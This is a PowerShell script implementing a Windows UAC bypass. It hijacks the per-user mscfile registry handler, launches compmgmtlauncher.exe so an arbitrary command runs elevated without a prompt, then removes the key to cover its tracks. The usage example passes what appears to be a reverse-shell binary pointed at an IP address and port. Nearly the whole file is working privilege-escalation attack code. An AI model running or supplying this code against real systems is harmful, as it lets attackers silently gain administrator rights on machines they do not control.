function Invoke-MscUacBypass {
<#
.SYNOPSIS
Expected to work on Win7, 8.1 and Win10

.EXAMPLE
Invoke-EventVwrBypass -Force -Command 'c:\test\cmdshell.exe 192.168.16.5 8080'
#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
    
    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution
        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
        #Add in the new registry entries to hijack the msc file
        if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $mscCommandPath -Force |
                New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $mscCommandPath) {
            Write-Verbose "Created registry entries to hijack the msc extension"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'compmgmtlauncher.exe'
        #Start Event Viewer
        if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
            $Process = Start-Process -FilePath $EventvwrPath -PassThru
        }

        #Sleep 5 seconds 
        #Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $mscfilePath = "HKCU:\Software\Classes\mscfile"

        if (Test-Path $mscfilePath) {
            #Remove the registry entry
            Remove-Item $mscfilePath -Recurse -Force
        }

    }
}
